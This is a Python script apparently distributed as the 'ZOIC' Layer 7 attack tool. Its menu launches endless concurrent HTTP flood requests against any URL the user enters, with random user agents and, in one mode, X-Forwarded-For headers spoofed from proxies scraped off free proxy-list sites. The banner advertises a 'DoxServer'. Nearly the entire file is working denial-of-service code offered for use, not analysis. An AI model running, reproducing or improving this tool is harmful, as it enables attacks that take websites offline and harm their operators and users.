import random
import aiohttp
import asyncio
import requests
import sys
import os
import re

zoic = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"
cyan = "\033[96m"

user_agent = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)"
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
	"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57"
	"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
	"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0"
	"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"
]


proxysite = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
]

def proxylist(url):
    proxies = []
    try:
        response = requests.get(url, timeout=5)
        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
        proxies.extend(proxy_list)
    except Exception as e:
        print(f"[ZOIC] {e}")
    return proxies

all_proxies = []
for site in proxysite:
    proxies = proxylist(site)
    all_proxies.extend(proxies)

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{zoic}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝ 
███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║  
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {zoic}*{clear} version   {zoic}:{clear}   4.0                                 ║
║ {zoic}*{clear} ZOIC      {zoic}:{clear}  {zoic}[{clear}{white}LAYER7{clear}{zoic}]{clear}                             ║  
╚═════════════════════════════════════════════════════╝
               
╔═════════════════════════════════════════════════════╗
║ {zoic}[{clear}1{zoic}]{clear} HTTP Flood Attack                               ║
║ {zoic}[{clear}2{zoic}]{clear} HTTP Flood Attack {zoic}[{clear}{white}PROXY{clear}{zoic}]{clear}                       ║                       
║ {zoic}[{clear}3{zoic}]{clear} Exit ZOIC                                       ║                                 
╚═════════════════════════════════════════════════════╝           
""")

def layer7():
    while True:
        logo()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{zoic}ZOIC{clear}] Url {zoic}:{clear} {url} {zoic}|{clear} Status {zoic}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)

            async def send_requests(url, threads):
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    while True: 
                        tasks = [send_request(session, url) for _ in range(threads)] 
                        await asyncio.gather(*tasks)  

            async def start_threads(url, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, threads))
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{zoic}ZOIC{clear}] URL     {zoic}>{clear} ")
            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD     {zoic}>{clear} "))
            print(f"[{zoic}ZOIC{clear}] {url}")
            asyncio.run(start_threads(url, threads))


        elif select == "2" or select.lower() == "2":
            async def send_request(session, url, proxy, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                    "X-Forwarded-For": proxy, 
                }
                
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{zoic}ZOIC{clear}] Url {zoic}:{clear} {zoic}{proxy}{clear} {zoic}>{clear} {url} {zoic}|{clear} Status {zoic}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by ZOIC !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)

            async def send_requests(url, proxy_list, threads):
                async with aiohttp.ClientSession() as session:
                    while True:
                        tasks = [
                            send_request(session, url, random.choice(proxy_list)) for _ in range(threads)
                        ]
                        await asyncio.gather(*tasks)

            async def start_threads(url, proxy_list, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, proxy_list, threads))  
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{zoic}ZOIC{clear}] URL     {zoic}>{clear} ")
            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD     {zoic}>{clear} "))
            print(f"[{zoic}ZOIC{clear}] {url}")
            asyncio.run(start_threads(url, all_proxies, threads)) 


        elif select == "3" or select.lower() == "3": 
            sys.exit()


if __name__ == "__main__":
    layer7()





